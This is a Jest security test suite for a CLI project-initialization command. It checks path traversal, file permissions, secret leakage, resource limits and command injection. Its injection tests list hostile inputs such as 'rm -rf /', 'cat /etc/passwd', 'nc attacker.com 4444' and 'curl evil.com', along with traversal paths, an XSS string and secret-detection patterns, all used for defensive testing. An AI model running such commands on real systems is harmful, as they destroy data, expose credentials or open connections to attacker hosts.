// init-security.test.js - Security validation tests for init operations
import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { promises as fs } from 'fs';
import { initCommand } from '../../src/cli/simple-commands/init/index.js';

const TEST_DIR = '/tmp/claude-flow-security-test';

describe('Init Security Tests', () => {
  beforeEach(async () => {
    try {
      await fs.rm(TEST_DIR, { recursive: true, force: true });
    } catch (err) {
      // Directory might not exist
    }
    await fs.mkdir(TEST_DIR, { recursive: true });
    process.chdir(TEST_DIR);
  });

  afterEach(async () => {
    try {
      await fs.rm(TEST_DIR, { recursive: true, force: true });
    } catch (err) {
      // Ignore cleanup errors
    }
  });

  describe('Path Traversal Prevention', () => {
    it('should not create files outside target directory', async () => {
      // Mock a malicious template that tries path traversal
      const maliciousTemplate = jest.fn(() => '# Malicious content');

      jest.doMock('../../src/cli/simple-commands/init/templates/claude-md.js', () => ({
        createOptimizedSparcClaudeMd: maliciousTemplate,
        createFullClaudeMd: maliciousTemplate,
      }));

      // Mock writeFile to track file paths
      const originalWriteFile = fs.writeFile;
      const writePaths = [];

      fs.writeFile = jest.fn(async (path, content, options) => {
        writePaths.push(path);
        // Only allow writes within TEST_DIR
        if (!path.startsWith(TEST_DIR) && !path.startsWith('.')) {
          throw new Error('Path traversal attempted');
        }
        return originalWriteFile(path, content, options);
      });

      await initCommand([], {});

      // Restore original function
      fs.writeFile = originalWriteFile;

      // Verify no path traversal occurred
      const suspiciousPaths = writePaths.filter(path =>
        path.includes('..') || path.startsWith('/')
      );
      expect(suspiciousPaths).toHaveLength(0);
    });

    it('should sanitize directory names', async () => {
      // Test with potentially dangerous directory names
      const dangerousNames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '/etc/shadow',
        'con', // Windows reserved name
        'aux', // Windows reserved name
        'nul', // Windows reserved name
      ];

      for (const name of dangerousNames) {
        try {
          // This should either sanitize the name or fail safely
          await fs.mkdir(name, { recursive: true });

          // If it succeeded, verify it didn't create outside our test dir
          const realPath = await fs.realpath(name);
          expect(realPath).toContain(TEST_DIR);
        } catch (err) {
          // Failing is acceptable for dangerous names
          expect(err).toBeDefined();
        }
      }
    });
  });

  describe('File Permissions and Ownership', () => {
    it('should create files with appropriate permissions', async () => {
      await initCommand([], {});

      // Check permissions on created files
      const files = [
        'CLAUDE.md',
        '.claude/settings.json',
        'memory/claude-flow@alpha-data.json',
      ];

      for (const file of files) {
        const stats = await fs.stat(file);
        const mode = stats.mode & parseInt('777', 8);

        // Should be readable and writable by owner, readable by group/others
        expect(mode & parseInt('600', 8)).toBe(parseInt('600', 8)); // Owner read/write
        expect(mode & parseInt('007', 8)).toBe(0); // No execute for others on data files
      }
    });

    it('should create executable files with correct permissions', async () => {
      await initCommand([], {});

      // Check executable files (if any are created)
      try {
        const helperFiles = await fs.readdir('.claude/helpers');
        for (const helper of helperFiles) {
          if (helper.endsWith('.sh')) {
            const stats = await fs.stat(`.claude/helpers/${helper}`);
            const mode = stats.mode & parseInt('777', 8);

            // Should be executable by owner
            expect(mode & parseInt('100', 8)).toBe(parseInt('100', 8));
          }
        }
      } catch (err) {
        // Helpers directory might not exist
      }
    });

    it('should not create world-writable files', async () => {
      await initCommand([], {});

      // Recursively check all created files
      async function checkPermissions(dir) {
        const entries = await fs.readdir(dir, { withFileTypes: true });

        for (const entry of entries) {
          const fullPath = `${dir}/${entry.name}`;
          const stats = await fs.stat(fullPath);
          const mode = stats.mode & parseInt('777', 8);

          // Should not be world-writable
          expect(mode & parseInt('002', 8)).toBe(0);

          if (entry.isDirectory()) {
            await checkPermissions(fullPath);
          }
        }
      }

      await checkPermissions('.');
    });
  });

  describe('Content Sanitization', () => {
    it('should not include sensitive information in generated files', async () => {
      await initCommand([], {});

      const sensitivePatterns = [
        /password\s*[:=]\s*['"][^'"]+['"]/i,
        /api_key\s*[:=]\s*['"][^'"]+['"]/i,
        /secret\s*[:=]\s*['"][^'"]+['"]/i,
        /token\s*[:=]\s*['"][^'"]+['"]/i,
        /private_key\s*[:=]/i,
      ];

      const filesToCheck = [
        'CLAUDE.md',
        '.claude/settings.json',
        '.mcp.json',
      ];

      for (const file of filesToCheck) {
        const content = await fs.readFile(file, 'utf8');

        for (const pattern of sensitivePatterns) {
          expect(content).not.toMatch(pattern);
        }
      }
    });

    it('should escape special characters in generated content', async () => {
      await initCommand([], {});

      const configFiles = [
        '.claude/settings.json',
        '.mcp.json',
        'memory/claude-flow@alpha-data.json',
      ];

      for (const file of configFiles) {
        const content = await fs.readFile(file, 'utf8');

        // Should be valid JSON (no unescaped characters)
        expect(() => JSON.parse(content)).not.toThrow();
      }
    });

    it('should not include code injection vectors', async () => {
      await initCommand([], {});

      const scriptPatterns = [
        /<script[^>]*>/i,
        /javascript:/i,
        /on\w+\s*=/i, // Event handlers
        /eval\s*\(/i,
        /function\s*\(/i,
        /\$\(/,  // jQuery
        /document\./i,
        /window\./i,
      ];

      const files = await fs.readdir('.', { recursive: true });

      for (const file of files) {
        try {
          const stats = await fs.stat(file);
          if (stats.isFile() && !file.endsWith('.test.js')) {
            const content = await fs.readFile(file, 'utf8');

            for (const pattern of scriptPatterns) {
              // Allow these in documentation/comments, but flag elsewhere
              if (!file.endsWith('.md') && !content.includes('```')) {
                const matches = content.match(pattern);
                if (matches) {
                  // Make sure it's in a comment or documentation context
                  const lines = content.split('\n');
                  let inCodeBlock = false;
                  let suspiciousLines = [];

                  for (let i = 0; i < lines.length; i++) {
                    const line = lines[i];
                    if (line.includes('```')) inCodeBlock = !inCodeBlock;

                    if (!inCodeBlock && !line.trim().startsWith('#') &&
                        !line.trim().startsWith('//') && pattern.test(line)) {
                      suspiciousLines.push(`${file}:${i + 1}: ${line.trim()}`);
                    }
                  }

                  expect(suspiciousLines).toHaveLength(0);
                }
              }
            }
          }
        } catch (err) {
          // Skip files that can't be read
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should safely handle malicious input in flags', async () => {
      const maliciousInputs = [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 4444',
        '`curl evil.com`',
        '$(whoami)',
        '${command}',
      ];

      for (const input of maliciousInputs) {
        // These should be handled safely without executing commands
        await expect(initCommand([input], {})).resolves.not.toThrow();
        await expect(initCommand([], { custom: input })).resolves.not.toThrow();
      }
    });

    it('should validate template names to prevent injection', async () => {
      const maliciousTemplates = [
        '../../../etc/passwd',
        'template; rm -rf /',
        'template && wget evil.com',
        'template | nc attacker.com',
      ];

      // Mock batch init to test template validation
      const { batchInitCommand } = await import('../../src/cli/simple-commands/init/batch-init.js');

      for (const template of maliciousTemplates) {
        const result = await batchInitCommand(['test-project'], {
          template,
          progressTracking: false,
          performanceMonitoring: false,
        });

        // Should either reject the template or handle it safely
        if (result && result.length > 0) {
          expect(result[0].success).toBe(false);
        }
      }
    });
  });

  describe('Resource Limits and DoS Prevention', () => {
    it('should limit file sizes to prevent disk exhaustion', async () => {
      // Mock a template that tries to create huge files
      const hugeContent = 'x'.repeat(100 * 1024 * 1024); // 100MB

      const maliciousTemplate = jest.fn(() => hugeContent);

      jest.doMock('../../src/cli/simple-commands/init/templates/claude-md.js', () => ({
        createOptimizedSparcClaudeMd: maliciousTemplate,
      }));

      // This should either limit the size or fail gracefully
      await expect(initCommand([], {})).resolves.not.toThrow();

      // Verify the file wasn't created with huge size
      try {
        const stats = await fs.stat('CLAUDE.md');
        expect(stats.size).toBeLessThan(10 * 1024 * 1024); // 10MB max
      } catch (err) {
        // File might not have been created, which is acceptable
      }
    });

    it('should limit directory depth to prevent stack overflow', async () => {
      // Try to create very deep directory structure
      const deepPath = Array.from({ length: 1000 }, (_, i) => `level${i}`).join('/');

      try {
        await fs.mkdir(deepPath, { recursive: true });
        process.chdir(deepPath);

        // This should handle deep paths gracefully
        await expect(initCommand([], {})).resolves.not.toThrow();
      } catch (err) {
        // System limits on path depth are acceptable
        expect(err.code).toMatch(/ENAMETOOLONG|ENOENT/);
      }
    });

    it('should handle many concurrent requests without crashing', async () => {
      const { batchInitCommand } = await import('../../src/cli/simple-commands/init/batch-init.js');

      // Create many projects to test resource limits
      const manyProjects = Array.from({ length: 100 }, (_, i) => `dos-test-${i}`);

      const startTime = Date.now();

      await expect(batchInitCommand(manyProjects, {
        maxConcurrency: 10,
        progressTracking: false,
        performanceMonitoring: false,
      })).resolves.not.toThrow();

      const endTime = Date.now();

      // Should complete in reasonable time (not hang)
      expect(endTime - startTime).toBeLessThan(120000); // 2 minutes max
    });
  });

  describe('Environment Variable Security', () => {
    it('should not expose sensitive environment variables', async () => {
      // Set some sensitive environment variables
      process.env.API_KEY = 'secret-key-123';
      process.env.PASSWORD = 'secret-password';
      process.env.TOKEN = 'secret-token';

      await initCommand([], {});

      // Check that these don't appear in generated files
      const files = await fs.readdir('.', { recursive: true });

      for (const file of files) {
        try {
          const stats = await fs.stat(file);
          if (stats.isFile()) {
            const content = await fs.readFile(file, 'utf8');

            expect(content).not.toContain('secret-key-123');
            expect(content).not.toContain('secret-password');
            expect(content).not.toContain('secret-token');
          }
        } catch (err) {
          // Skip files that can't be read
        }
      }

      // Clean up
      delete process.env.API_KEY;
      delete process.env.PASSWORD;
      delete process.env.TOKEN;
    });

    it('should sanitize environment variables in templates', async () => {
      // Set environment variables that might be used in templates
      process.env.PROJECT_NAME = '<script>alert("xss")</script>';
      process.env.USER_NAME = '$(whoami)';

      await initCommand([], {});

      const files = [
        'CLAUDE.md',
        '.claude/settings.json',
      ];

      for (const file of files) {
        const content = await fs.readFile(file, 'utf8');

        // Should not contain unescaped environment variable values
        expect(content).not.toContain('<script>alert("xss")</script>');
        expect(content).not.toContain('$(whoami)');
      }

      // Clean up
      delete process.env.PROJECT_NAME;
      delete process.env.USER_NAME;
    });
  });

  describe('Temporary File Security', () => {
    it('should create temporary files with secure permissions', async () => {
      await initCommand([], {});

      // Check for any temporary files created
      const tmpFiles = await fs.readdir('/tmp').catch(() => []);
      const claudeTmpFiles = tmpFiles.filter(f => f.includes('claude-flow'));

      for (const tmpFile of claudeTmpFiles) {
        const stats = await fs.stat(`/tmp/${tmpFile}`).catch(() => null);
        if (stats) {
          const mode = stats.mode & parseInt('777', 8);

          // Temporary files should not be world-readable
          expect(mode & parseInt('044', 8)).toBe(0);
        }
      }
    });

    it('should clean up temporary files on completion', async () => {
      const beforeTmpFiles = await fs.readdir('/tmp').catch(() => []);

      await initCommand([], {});

      const afterTmpFiles = await fs.readdir('/tmp').catch(() => []);
      const newTmpFiles = afterTmpFiles.filter(f =>
        !beforeTmpFiles.includes(f) && f.includes('claude-flow')
      );

      // Should not leave temporary files behind
      expect(newTmpFiles).toHaveLength(0);
    });
  });
});